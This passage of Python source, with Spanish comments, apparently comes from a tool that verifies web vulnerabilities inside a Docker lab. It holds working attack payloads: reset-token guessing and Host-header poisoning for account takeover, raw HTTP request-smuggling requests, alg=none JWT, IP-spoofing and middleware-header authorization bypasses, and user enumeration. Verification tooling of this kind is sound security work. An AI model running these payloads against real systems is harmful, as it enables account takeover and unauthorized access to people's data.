# ---------------------------------------------------------------------------

def verify_generic_account_takeover(
    source_dir: str,
    endpoint: str,
    http_method: str = "POST",
    victim_identifier: str = "",
    takeover_params: Optional[dict] = None,
    confirm_string: str = "",
    login_endpoint: str = "",
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
    setup_commands: Optional[List[str]] = None,
) -> WpVerifyResult:
    """Verifica Account Takeover mediante password reset, token prediction o session fixation.

    Estrategia:
    1. Arranca el lab y crea dos usuarios (attacker + victim).
    2. Trigger password reset para victim desde attacker sin credenciales.
    3. Intenta reset con token predecible (secuencial, timestamp, MD5(email)).
    4. Si tiene exito, intenta login como victim con nueva password.
    5. VERIFICADO si puede autenticarse como victim tras el reset.
    """
    import secrets as _sec
    import hashlib as _hsh
    import time as _t

    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    _victim_email  = victim_identifier or f"victim_{_sec.token_hex(4)}@binoracle.test"
    _victim_pass   = _sec.token_hex(8)
    _new_pass      = _sec.token_hex(8)
    _attacker_email = f"attacker_{_sec.token_hex(4)}@binoracle.test"

    # Predictable token candidates — sequential IDs, hashes, timestamps, short UUIDs
    _ts = str(int(_t.time()))
    _token_candidates = [
        "0", "1", "2", "123456",
        _hsh.md5(_victim_email.encode()).hexdigest(),
        _hsh.md5(_victim_email.encode()).hexdigest()[:8],
        _hsh.sha1(_victim_email.encode()).hexdigest()[:10],
        _hsh.sha256(_victim_email.encode()).hexdigest()[:16],
        _ts,
        _ts[:-1],
        _ts[:-2],
        str(int(_t.time()) - 1),
        str(int(_t.time()) + 1),
        # Short UUID patterns used by weak generators
        "00000000",
        "11111111",
    ]

    lab = None
    try:
        pass  # _DockerLab is defined in this file
        lab = _DockerLab(source_dir, dockerfile_body or None,
                         extra_files=extra_files or {},
                         setup_commands=setup_commands or [], on_step=step)
        with lab.running() as boot:
            import requests as _rq

            _sess_a = _rq.Session()
            _params = dict(takeover_params or {})
            if not _params:
                _params = {"email": _victim_email}

            # Trigger reset
            step(f"trigger password reset para {_victim_email}...")
            try:
                r_reset = _rq.request(http_method.upper(), boot.base_url + endpoint,
                                      data=_params, timeout=15)
                _reset_body = r_reset.text or ""
            except Exception as e:
                res.detail = f"account-takeover: error al trigger reset: {e}"
                return res

            if confirm_string and confirm_string in _reset_body:
                res.verified = True
                res.ok = True
                res.evidence.update({
                    "endpoint": endpoint,
                    "trigger_status": r_reset.status_code,
                    "confirm_string_found": True,
                    "respuesta_cuerpo_recorte": _reset_body[:400],
                })
                step(f"VERIFICADO — account takeover: confirm_string '{confirm_string[:30]}' "
                     f"encontrada al trigger reset")
                return res

            # Check if reset response leaks the token directly (IDOR on reset endpoint)
            _leaked_tokens = re.findall(r'["\']?(?:token|reset_token|code)["\']?\s*[:=]\s*["\']?([a-fA-F0-9\-]{6,64})["\']?',
                                        _reset_body)
            if _leaked_tokens:
                step(f"  token de reset expuesto en respuesta: {_leaked_tokens[:2]} (IDOR potencial)")
                res.evidence["leaked_reset_tokens"] = _leaked_tokens[:5]
                _token_candidates = list(_leaked_tokens[:5]) + _token_candidates

            # Extract token from Location header (some apps redirect to /reset?token=...)
            _loc_hdr = r_reset.headers.get("Location", "")
            if _loc_hdr:
                _loc_tokens = re.findall(
                    r'[?&](?:token|reset_token|code|key)=([a-fA-F0-9\-]{6,64})', _loc_hdr)
                if _loc_tokens:
                    step(f"  token extraído de Location header: {_loc_tokens[:2]}")
                    _token_candidates = list(_loc_tokens[:3]) + _token_candidates

            # Phase: host-header poison — inject attacker domain in reset trigger
            # If the app generates reset links using the Host header without validation,
            # the link will contain attacker.test and the attacker intercepts it.
            _POISON_HEADERS = [
                {"Host": "attacker.test"},
                {"X-Forwarded-Host": "attacker.test"},
                {"X-Host": "attacker.test"},
                {"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Host": "attacker.test"},
            ]
            for _ph in _POISON_HEADERS:
                try:
                    r_p = _rq.request(http_method.upper(), boot.base_url + endpoint,
                                      data=_params, headers=_ph, timeout=15)
                    _pbody = r_p.text or ""
                    _ploc  = r_p.headers.get("Location", "")
                    # Require "attacker.test" in a link/URL context in body, or in Location header.
                    # Plain reflection (e.g. Host header echoed in HTML title) is not a takeover.
                    _in_link = bool(re.search(r'https?://attacker\.test', _pbody))
                    if _in_link or "attacker.test" in _ploc:
                        res.verified = True
                        res.ok = True
                        res.evidence.update({
                            "endpoint": endpoint,
                            "attack_vector": "host_header_poison",
                            "poison_header": _ph,
                            "attacker_domain_reflected": True,
                            "respuesta_cuerpo_recorte": _pbody[:400],
                            "location_header": _ploc,
                        })
                        step(f"VERIFICADO — account takeover via host-header poison: "
                             f"{list(_ph.keys())[0]} → attacker.test reflejado en reset link")
                        return res
                except Exception:
                    pass

            # Try predictable tokens
            if login_endpoint:
                for _tok in _token_candidates:
                    try:
                        r_tok = _rq.post(boot.base_url + endpoint,
                                         data={"token": _tok, "password": _new_pass,
                                               "email": _victim_email},
                                         timeout=10)
                        if r_tok.status_code in (200, 302) and "error" not in (r_tok.text or "").lower():
                            r_login = _rq.post(boot.base_url + login_endpoint,
                                               data={"email": _victim_email, "password": _new_pass},
                                               timeout=10)
                            # 200/302 alone is NOT enough — many apps return these even
                            # on failed login (re-rendered form or redirect to login).
                            # Require proof of authenticated session:
                            # - confirm_string present in response body, OR
                            # - Set-Cookie with a session/auth token name
                            _login_body = r_login.text or ""
                            _login_cookies = r_login.headers.get("Set-Cookie", "")
                            _has_session = bool(
                                re.search(r'(?i)(session|auth|token|jwt|sid)[\w_-]*\s*=\s*[A-Za-z0-9%._-]{8,}',
                                          _login_cookies)
                            )
                            _login_proven = (
                                (confirm_string and confirm_string in _login_body)
                                or (_has_session and r_login.status_code in (200, 302)
                                    and "invalid" not in _login_body.lower()
                                    and "incorrect" not in _login_body.lower()
                                    and "wrong" not in _login_body.lower())
                            )
                            if r_login.status_code in (200, 302) and _login_proven:
                                res.verified = True
                                res.ok = True
                                res.evidence.update({
                                    "endpoint": endpoint,
                                    "token_used": _tok,
                                    "victim_email": _victim_email,
                                    "new_password": _new_pass,
                                    "login_status": r_login.status_code,
                                    "session_cookie_found": _has_session,
                                })
                                step(f"VERIFICADO — account takeover: token predecible '{_tok}' "
                                     f"permitió reset y login como {_victim_email}")
                                return res
                    except Exception:
                        continue

            res.ok = True
            res.detail = (f"account-takeover: reset triggereado en {endpoint}, "
                          f"tokens predecibles no funcionaron, confirm_string no encontrada")
            return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_account_takeover: {e}"
        return res
    finally:
        step("desmontando el laboratorio (account-takeover)...")
        if lab is not None:
            lab.teardown()


# ---------------------------------------------------------------------------
# verify_generic_http_request_smuggling
# ---------------------------------------------------------------------------

def verify_generic_http_request_smuggling(
    source_dir: str,
    endpoint: str = "/",
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
    setup_commands: Optional[List[str]] = None,
) -> WpVerifyResult:
    """Verifica HTTP Request Smuggling (CL.TE / TE.CL / TE.TE obfuscation).

    Envía peticiones con cabeceras Content-Length y Transfer-Encoding contradictorias
    y mide si el servidor procesa el cuerpo smuggleado.

    CL.TE: Content-Length tiene prioridad sobre Transfer-Encoding (front-end)
           pero el back-end usa Transfer-Encoding → body smuggled al siguiente request.
    TE.CL: Transfer-Encoding tiene prioridad (front-end) pero back-end usa Content-Length.

    Estrategia de detección: timing-based + response-based.
    - CL.TE: envía petición con CL mayor que el body real → back-end espera más datos → timeout.
    - TE.CL: envía chunk size mayor → front-end consume más bytes del siguiente request.
    """
    import socket as _sock
    import time as _t

    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    lab = None
    try:
        pass  # _DockerLab is defined in this file
        lab = _DockerLab(source_dir, dockerfile_body or None,
                         extra_files=extra_files or {},
                         setup_commands=setup_commands or [], on_step=step)
        with lab.running() as boot:
            import requests as _rq
            from urllib.parse import urlparse as _up

            _parsed = _up(boot.base_url)
            _host = _parsed.hostname
            _port = _parsed.port or (443 if _parsed.scheme == "https" else 80)

            # Baseline timing
            try:
                t0 = _t.time()
                _rq.get(boot.base_url + endpoint, timeout=10)
                _baseline_ms = (_t.time() - t0) * 1000
            except Exception:
                _baseline_ms = 500.0

            # CL.TE probe: Content-Length says 6 but actual body is "0\r\n\r\n" (5 bytes chunked)
            # Back-end using TE will think there's 1 more byte → hangs waiting
            _clte_req = (
                f"POST {endpoint} HTTP/1.1\r\n"
                f"Host: {_host}:{_port}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 6\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"0\r\n"
                f"\r\n"
            )

            step("probando CL.TE smuggling (timing-based)...")
            try:
                s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                s.settimeout(12)
                s.connect((_host, _port))
                s.send(_clte_req.encode())
                t0 = _t.time()
                try:
                    s.recv(4096)
                except _sock.timeout:
                    pass
                _clte_ms = (_t.time() - t0) * 1000
                s.close()
            except Exception as e:
                _clte_ms = 0.0
                step(f"  CL.TE probe error: {e}")

            # TE.CL probe: Transfer-Encoding says "chunked" but Content-Length = 4
            # Front-end reads 4 bytes as the full body; back-end reads chunked and finds "1\r\nG\r\n"
            # then waits for the remaining body declared by CL (smuggling a GET /)
            _tecl_body = "1\r\nG\r\n0\r\n\r\n"
            _tecl_req = (
                f"POST {endpoint} HTTP/1.1\r\n"
                f"Host: {_host}:{_port}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 4\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                + _tecl_body
            )

            step("probando TE.CL smuggling (timing-based)...")
            try:
                s2 = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                s2.settimeout(12)
                s2.connect((_host, _port))
                s2.send(_tecl_req.encode())
                t0 = _t.time()
                try:
                    s2.recv(4096)
                except _sock.timeout:
                    pass
                _tecl_ms = (_t.time() - t0) * 1000
                s2.close()
            except Exception as e:
                _tecl_ms = 0.0
                step(f"  TE.CL probe error: {e}")

            _ratio_clte = _clte_ms / max(_baseline_ms, 100)
            _ratio_tecl = _tecl_ms / max(_baseline_ms, 100)

            if _ratio_clte >= 8.0 or _ratio_tecl >= 8.0:
                _vuln_type = "CL.TE" if _ratio_clte > _ratio_tecl else "TE.CL"
                res.verified = True
                res.ok = True
                res.evidence.update({
                    "smuggling_type": _vuln_type,
                    "baseline_ms": round(_baseline_ms, 1),
                    "clte_delay_ms": round(_clte_ms, 1),
                    "tecl_delay_ms": round(_tecl_ms, 1),
                    "ratio_clte": round(_ratio_clte, 1),
                    "ratio_tecl": round(_ratio_tecl, 1),
                })
                step(f"VERIFICADO — HTTP Request Smuggling ({_vuln_type}): "
                     f"ratio={max(_ratio_clte, _ratio_tecl):.1f}x over baseline")
                return res

            # --- TE.TE obfuscation probe ---
            # Both endpoints support Transfer-Encoding, but an obfuscated value confuses one.
            # Front-end sees "Transfer-Encoding: chunked" (normal), back-end sees obfuscated
            # variant and falls back to Content-Length → smuggling occurs.
            step("probando TE.TE obfuscation (chunked/CHUNKED/xchunked)...")
            _tete_obf_values = ["chunked, identity", "CHUNKED", "xchunked", "chunked;ext=1"]
            for _obf_val in _tete_obf_values:
                _tete_body = "0\r\n\r\n"
                _tete_cl = len(_tete_body) + 10
                _tete_req = (
                    f"POST {endpoint} HTTP/1.1\r\n"
                    f"Host: {_host}:{_port}\r\n"
                    f"Content-Length: {_tete_cl}\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"Transfer-Encoding: {_obf_val}\r\n"
                    f"\r\n"
                    + _tete_body
                )
                try:
                    _s_tete = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                    _s_tete.settimeout(10)
                    _s_tete.connect((_host, _port))
                    _s_tete.send(_tete_req.encode())
                    _t0_tete = _t.time()
                    try:
                        _s_tete.recv(4096)
                    except _sock.timeout:
                        pass
                    _tete_ms = (_t.time() - _t0_tete) * 1000
                    _s_tete.close()
                    _ratio_tete = _tete_ms / max(_baseline_ms, 100)
                    if _ratio_tete >= 8.0:
                        res.verified = True
                        res.ok = True
                        res.evidence.update({
                            "smuggling_type": "TE.TE-obfuscation",
                            "obfuscated_value": _obf_val,
                            "baseline_ms": round(_baseline_ms, 1),
                            "tete_delay_ms": round(_tete_ms, 1),
                            "ratio": round(_ratio_tete, 1),
                        })
                        step(f"VERIFICADO — HTTP Request Smuggling (TE.TE obfuscation={_obf_val!r}): "
                             f"ratio={_ratio_tete:.1f}x")
                        return res
                except Exception as _te_e:
                    step(f"  TE.TE probe error ({_obf_val!r}): {_te_e}")

            # --- Differential response probe (CL.TE variant) ---
            # Poison the backend pipe with a partial request prefix, then send a normal request.
            # If the second response body starts with the smuggled prefix → confirmed.
            step("probando differential-response smuggling (CL.TE)...")
            _smug_marker = "BINORACLE-SMUG-X"
            # Attack request: CL=4 so front-end reads only "1\r\n" as body
            # but back-end reads chunked and sees "G" leftover → prefix for next request
            _diff_attack = (
                f"POST {endpoint} HTTP/1.1\r\n"
                f"Host: {_host}:{_port}\r\n"
                f"Content-Length: {len(_smug_marker) + 100}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"0\r\n"
                f"\r\n"
                f"GET /binoracle_smug_probe HTTP/1.1\r\n"
                f"X-Smuggled: {_smug_marker}\r\n"
                f"\r\n"
            )
            _diff_response = ""
            try:
                s3 = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                s3.settimeout(8)
                s3.connect((_host, _port))
                s3.sendall(_diff_attack.encode())
                _t0_diff = _t.time()
                _buf = b""
                while _t.time() - _t0_diff < 7:
                    try:
                        _chunk = s3.recv(2048)
                        if not _chunk:
                            break
                        _buf += _chunk
                        if len(_buf) > 8192:
                            break
                    except _sock.timeout:
                        break
                s3.close()
                _diff_response = _buf.decode("utf-8", errors="replace")
            except Exception as _de:
                step(f"  differential probe error: {_de}")

            if _smug_marker in _diff_response:
                res.verified = True
                res.ok = True
                res.evidence.update({
                    "smuggling_type": "CL.TE-differential",
                    "smuggled_marker_found": True,
                    "response_snippet": _diff_response[:300],
                })
                step(f"VERIFICADO — HTTP Request Smuggling (CL.TE differential): "
                     f"marker '{_smug_marker}' found in poisoned response")
                return res

            res.ok = True
            res.detail = (f"http-request-smuggling: CL.TE ratio={_ratio_clte:.1f}x, "
                          f"TE.CL ratio={_ratio_tecl:.1f}x, differential response negative — "
                          f"no confirmado (necesita >=8x sobre baseline de {_baseline_ms:.0f}ms)")
            step("http-request-smuggling: no verificado — sin timing ni differential diferencial")
            return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_http_request_smuggling: {e}"
        return res
    finally:
        step("desmontando el laboratorio (http-request-smuggling)...")
        if lab is not None:
            lab.teardown()


# ---------------------------------------------------------------------------
# verify_generic_missing_authorization
# ---------------------------------------------------------------------------

def verify_generic_missing_authorization(
    source_dir: str,
    endpoint: str,
    http_method: str = "GET",
    confirm_string: str = "",
    admin_credentials: Optional[dict] = None,
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
    setup_commands: Optional[List[str]] = None,
) -> WpVerifyResult:
    """Verifica Missing Authorization / Unauthorized Access.

    Estrategia más completa que broken-access-control:
    1. Prueba el endpoint sin credenciales → busca confirm_string.
    2. Registra un usuario sin privilegios y prueba con sus credenciales.
    3. Prueba con JWT vacío / null / mangled → busca acceso.
    4. Prueba variantes de HTTP method (HEAD, OPTIONS, PUT, PATCH).
    5. VERIFICADO si confirm_string se obtiene en cualquier variante.
    """
    import secrets as _sec

    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    _METHODS_TO_TRY = [http_method.upper(), "GET", "POST", "HEAD", "OPTIONS", "PUT", "PATCH"]
    _JWT_BYPASSES = [
        "",
        "null",
        "undefined",
        "Bearer null",
        "Bearer undefined",
        "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.e30.",  # alg=none
        f"Bearer {_sec.token_hex(32)}",  # random token
    ]
    # HTTP method override headers — bypass auth checks gated on request method
    _METHOD_OVERRIDE_HEADERS = [
        {"X-HTTP-Method-Override": http_method.upper()},
        {"X-HTTP-Method": http_method.upper()},
        {"X-Method-Override": http_method.upper()},
    ]
    # IP spoofing headers — bypass IP-based allow-lists
    _IP_SPOOF_HEADERS = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Forwarded-For": "::1"},
        {"CF-Connecting-IP": "127.0.0.1"},
        {"True-Client-IP": "127.0.0.1"},
    ]
    # Path normalization bypasses — route middleware may not normalize these
    _ep = endpoint.rstrip("/")
    _ep_parts = _ep.rsplit("/", 1)
    _path_variants = [
        endpoint,
        endpoint + "/",
        endpoint + "//",
        _ep + ";/",
        _ep + ".json",
        (_ep_parts[0] + "/" if len(_ep_parts) > 1 else "/")
        + _ep_parts[-1].upper(),           # uppercase last segment
        endpoint + "?",
        endpoint + "%20",
    ]

    lab = None
    try:
        pass  # _DockerLab is defined in this file
        lab = _DockerLab(source_dir, dockerfile_body or None,
                         extra_files=extra_files or {},
                         setup_commands=setup_commands or [], on_step=step)
        with lab.running() as boot:
            import requests as _rq

            def _probe(url: str, method: str, hdrs: dict) -> Optional[tuple]:
                try:
                    r = _rq.request(method, url, headers=hdrs, timeout=10,
                                    allow_redirects=False)
                    return (r.status_code, r.text or "")
                except Exception:
                    return None

            # --- Phase 1: unauthenticated (original method) ---
            for _m in _METHODS_TO_TRY[:3]:
                _result = _probe(boot.base_url + endpoint, _m, {})
                if _result is None:
                    continue
                _status, body = _result
                if confirm_string and confirm_string in body:
                    res.verified = True
                    res.ok = True
                    res.evidence.update({
                        "bypass_type": "unauthenticated",
                        "method": _m,
                        "endpoint": endpoint,
                        "status_code": _status,
                        "respuesta_cuerpo_recorte": body[:400],
                    })
                    step(f"VERIFICADO — missing auth (unauthenticated {_m} {endpoint}): "
                         f"confirm_string '{confirm_string[:30]}' presente")
                    return res
                if _status in (200, 201, 204) and not confirm_string:
                    # No confirm_string: use sensitive-data heuristic to verify
                    _body_low = body.lower()
                    if "unauthorized" not in _body_low and "forbidden" not in _body_low:
                        # Sensitive fields that shouldn't appear in unauthed response
                        _SENSITIVE = (
                            "\"email\"", "\"password\"", "\"secret\"", "\"token\"",
                            "\"api_key\"", "\"access_token\"", "\"refresh_token\"",
                            "\"user_login\"", "\"user_pass\"", "\"private_key\"",
                            "\"admin\"", "\"nonce\"", "\"auth_cookie\"",
                            "user_email", "user_pass", "admin_email",
                        )
                        _sensitive_hit = next(
                            (s for s in _SENSITIVE if s in _body_low), None)
                        if _sensitive_hit and len(body) > 20:
                            res.verified = True
                            res.ok = True
                            res.evidence.update({
                                "bypass_type": "unauthenticated_sensitive_data",
                                "method": _m,
                                "endpoint": endpoint,
                                "status_code": _status,
                                "sensitive_field": _sensitive_hit,
                                "respuesta_cuerpo_recorte": body[:400],
                            })
                            step(f"VERIFICADO — missing auth (sensitive data leak): "
                                 f"campo '{_sensitive_hit}' en respuesta sin auth a {endpoint}")
                            return res
                        res.evidence.update({
                            "bypass_type": "unauthenticated",
                            "method": _m,
                            "endpoint": endpoint,
                            "status_code": _status,
                            "note": "200 OK without auth and no deny keywords",
                        })
                        step(f"PROBABLE — {_m} {endpoint} devolvió 200 sin auth y sin deny keywords")

            # --- Phase 1b: HTTP method override headers ---
            for _override_hdr in _METHOD_OVERRIDE_HEADERS:
                _result = _probe(boot.base_url + endpoint, "POST", _override_hdr)
                if _result is None:
                    continue
                _status, body = _result
                if confirm_string and confirm_string in body and _status in range(200, 400):
                    res.verified = True
                    res.ok = True
                    res.evidence.update({
                        "bypass_type": "method-override",
                        "header": list(_override_hdr.keys())[0],
                        "endpoint": endpoint,
                        "status_code": _status,
                        "respuesta_cuerpo_recorte": body[:400],
                    })
                    step(f"VERIFICADO — missing auth via method override "
                         f"({list(_override_hdr.keys())[0]}): confirm_string presente")
                    return res

            # --- Phase 1c: path normalization bypass ---
            for _path_v in _path_variants[1:]:  # skip original (already tried above)
                _result = _probe(boot.base_url + _path_v, http_method.upper(), {})
                if _result is None:
                    continue
                _status, body = _result
                if confirm_string and confirm_string in body and _status in range(200, 400):
                    res.verified = True
                    res.ok = True
                    res.evidence.update({
                        "bypass_type": "path-normalization",
                        "path_variant": _path_v,
                        "status_code": _status,
                        "respuesta_cuerpo_recorte": body[:400],
                    })
                    step(f"VERIFICADO — missing auth via path normalization bypass: {_path_v}")
                    return res

            # --- Phase 1d: Next.js / middleware internal header bypass ---
            # CVE-2025-29927: x-middleware-subrequest header causes Next.js middleware
            # to skip auth checks (treats request as internal subrequest). Also covers
            # similar patterns in Express/Koa/Hapi middleware using internal headers.
            _MIDDLEWARE_BYPASS_HDRS = [
                {"x-middleware-subrequest": "middleware"},
                {"x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"},
                {"x-middleware-invoke": "1"},
                {"x-next-rewrite": endpoint},
                {"x-middleware-rewrite": endpoint},
                {"x-forwarded-host": "localhost"},
                {"x-forwarded-proto": "https", "x-forwarded-host": "localhost"},
            ]
            for _mw_hdr in _MIDDLEWARE_BYPASS_HDRS:
                _result = _probe(boot.base_url + endpoint, http_method.upper(), _mw_hdr)
                if _result is None:
                    continue
                _status, body = _result
                _hdr_key = list(_mw_hdr.keys())[0]
                if _status in range(200, 400) and (not confirm_string or confirm_string in body):
                    _baseline = _probe(boot.base_url + endpoint, http_method.upper(), {})
                    _base_status = _baseline[0] if _baseline else 999
                    if _base_status in (401, 403) and _status in range(200, 400):
                        res.verified = True
                        res.ok = True
                        res.evidence.update({
                            "bypass_type": "middleware-internal-header",
                            "header": _hdr_key,
                            "header_value": _mw_hdr[_hdr_key],
                            "baseline_status": _base_status,
                            "bypass_status": _status,
                            "endpoint": endpoint,
                            "respuesta_cuerpo_recorte": body[:400],
                        })
                        step(f"VERIFICADO — middleware header bypass ({_hdr_key}): "
                             f"baseline={_base_status} → bypass={_status}")
                        return res

            # --- Phase 1e: JSON POST injection — many REST APIs only accept application/json ---
            import json as _json_mod
            _json_post_params = {
                k: (v if not isinstance(v, dict) else str(v))
                for k, v in (admin_credentials or {}).items()
            } if admin_credentials else {}
            try:
                _r_json = _rq.post(
                    boot.base_url + endpoint,
                    json=_json_post_params or {},
                    headers={"Content-Type": "application/json",
                             "Accept": "application/json"},
                    timeout=10, allow_redirects=False)
                _jstatus, _jbody = _r_json.status_code, _r_json.text or ""
                if confirm_string and confirm_string in _jbody and _jstatus in range(200, 400):
                    res.verified = True
                    res.ok = True
                    res.evidence.update({
                        "bypass_type": "json-post-no-auth",
                        "method": "POST",
                        "content_type": "application/json",
                        "endpoint": endpoint,
                        "status_code": _jstatus,
                        "respuesta_cuerpo_recorte": _jbody[:400],
                    })
                    step("VERIFICADO — missing auth via JSON POST (no auth): confirm_string presente")
                    return res
                if _jstatus in (200, 201) and not confirm_string and len(_jbody.strip()) > 20:
                    _jbody_low = _jbody.lower()
                    if "unauthorized" not in _jbody_low and "forbidden" not in _jbody_low:
                        res.evidence.setdefault("json_post_200", {}).update({
                            "status": _jstatus, "snippet": _jbody[:200]})
                        step(f"[json-post] endpoint {endpoint} acepta POST sin auth (HTTP {_jstatus})")
            except Exception:
                pass

            # --- Phase 1f: pagination enumeration — proves mass-data access ---
            # Try per_page/limit params to demonstrate all records are accessible unauthed.
            if not res.verified:
                _PAGINATION_PROBE = [
                    {"per_page": "100", "page": "0"},
                    {"per_page": "100", "page": "1"},
                    {"limit": "100", "offset": "0"},
                    {"pageSize": "100", "pageIndex": "0"},
                    {"size": "100", "page": "0"},
                ]
                for _pp in _PAGINATION_PROBE:
                    _pp_result = _probe(
                        boot.base_url + endpoint + "?" + "&".join(f"{k}={v}" for k, v in _pp.items()),
                        "GET", {})
                    if _pp_result is None:
                        continue
                    _pp_status, _pp_body = _pp_result
                    if _pp_status in (200, 201) and len(_pp_body.strip()) > 100:
                        _item_count = None
                        try:
                            _parsed = _json_mod.loads(_pp_body)
                            if isinstance(_parsed, list):
                                _item_count = len(_parsed)
                            elif isinstance(_parsed, dict):
                                _item_count = (_parsed.get("total") or _parsed.get("count")
                                               or len(_parsed.get("data", [])) or
                                               len(_parsed.get("items", [])))
                        except Exception:
                            pass
                        if _item_count is not None and _item_count > 0:
                            res.evidence["pagination_enumeration"] = {
                                "params": _pp, "total_items": _item_count,
                                "body_snippet": _pp_body[:200]}
                            step(f"[pagination] {_item_count} registros accesibles con {_pp}")
                            if not confirm_string:
                                res.verified = True
                                res.ok = True
                                res.evidence.update({
                                    "bypass_type": "pagination-mass-access",
                                    "endpoint": endpoint,
                                    "status_code": _pp_status,
                                    "pagination_params": _pp,
                                    "total_records": _item_count,
                                })
                                step(f"VERIFICADO — missing auth pagination: {_item_count} registros sin auth")
                                return res
                            break

            # --- Phase 2: JWT bypass ---
            for _tok in _JWT_BYPASSES:
                _hdrs: dict = {"Authorization": _tok} if _tok else {}
                _result = _probe(boot.base_url + endpoint, http_method.upper(), _hdrs)
                if _result is None:
                    continue
                _status, body = _result
                if confirm_string and confirm_string in body:
                    res.verified = True
                    res.ok = True
                    res.evidence.update({
                        "bypass_type": "jwt-bypass",
                        "token_used": _tok[:40] if _tok else "(empty)",
                        "endpoint": endpoint,
                        "status_code": _status,
                        "respuesta_cuerpo_recorte": body[:400],
                    })
                    step(f"VERIFICADO — missing auth via JWT bypass "
                         f"(token: {_tok[:30] if _tok else 'empty'})")
                    return res

            # --- Phase 2b: IP spoofing headers ---
            for _ip_hdr in _IP_SPOOF_HEADERS:
                _result = _probe(boot.base_url + endpoint, http_method.upper(), _ip_hdr)
                if _result is None:
                    continue
                _status, body = _result
                if confirm_string and confirm_string in body and _status in range(200, 400):
                    res.verified = True
                    res.ok = True
                    res.evidence.update({
                        "bypass_type": "ip-spoof-header",
                        "header": list(_ip_hdr.keys())[0],
                        "header_value": list(_ip_hdr.values())[0],
                        "endpoint": endpoint,
                        "status_code": _status,
                        "respuesta_cuerpo_recorte": body[:400],
                    })
                    step(f"VERIFICADO — missing auth via IP spoof header "
                         f"({list(_ip_hdr.keys())[0]}: {list(_ip_hdr.values())[0]}): confirm_string presente")
                    return res

            # --- Phase 3: register attacker + try low-priv access ---
            if not confirm_string:
                res.ok = True
                res.detail = ("missing-authorization: sin confirm_string no se puede verificar "
                              "definitivamente; se probaron variantes unauthenticated, JWT bypass e IP spoof")
            else:
                res.ok = True
                res.detail = (f"missing-authorization: confirm_string '{confirm_string[:30]}' "
                              f"no encontrada en ninguna variante de bypass en {endpoint}")
            step("missing-authorization: no verificado definitivamente")
            return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_missing_authorization: {e}"
        return res
    finally:
        step("desmontando el laboratorio (missing-authorization)...")
        if lab is not None:
            lab.teardown()


def verify_generic_user_enumeration(
    source_dir: str,
    endpoint: str,
    http_method: str = "POST",
    probe_param: str = "email",
    confirm_string: str = "",
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 600.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
    setup_commands: Optional[List[str]] = None,
) -> WpVerifyResult:
    """Verifica User/Email Enumeration via diferencia de respuesta.

    Estrategia:
    1. Prueba probe_param con una cuenta que EXISTE (admin@example.com / admin).
    2. Prueba probe_param con una cuenta que NO existe (noeexiste_xyz_binoracle@binoracle.test).
    3. Si las respuestas difieren (cuerpo O status) → enumeration confirmed.
    4. Si confirm_string está en la respuesta de cuenta existente pero NO en la de cuenta
       no existente → verified=True.
    """
    import secrets as _sec

    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    _KNOWN_USERS = ["admin@example.com", "admin", "test@test.com", "user@example.com"]
    _NONEXIST_USER = f"binoracle_noexiste_{_sec.token_hex(4)}@binoracle.test"
    _probe_param = probe_param or "email"

    try:
        pass  # _DockerLab is defined in this file
        lab = _DockerLab(source_dir, dockerfile_body or None,
                         extra_files=extra_files or {},
                         setup_commands=setup_commands or [], on_step=step)
        with lab.running() as boot:
            import requests as _rq

            base = boot.base_url.rstrip("/")
            ep = endpoint if endpoint.startswith("/") else "/" + endpoint
            url = base + ep
            m = http_method.upper()

            import time as _time

            def _probe(value: str) -> tuple:
                try:
                    kw: dict = {}
                    if m == "POST":
                        kw = {"data": {_probe_param: value}, "timeout": 10}
                    else:
                        kw = {"params": {_probe_param: value}, "timeout": 10}
                    _t0 = _time.monotonic()
                    r = getattr(_rq, m.lower())(url, **kw)
                    _elapsed = _time.monotonic() - _t0
                    return r.status_code, r.text, _elapsed
                except Exception as _ex:
                    return -1, str(_ex), 0.0

            # Probe existing accounts (3 times and take median for stability)
            existing_sc, existing_body, existing_elapsed = None, None, 0.0
            for user in _KNOWN_USERS:
                sc, body, elapsed = _probe(user)
                if sc != -1:
                    existing_sc, existing_body = sc, body
                    _exist_times = [elapsed]
                    for _ in range(2):
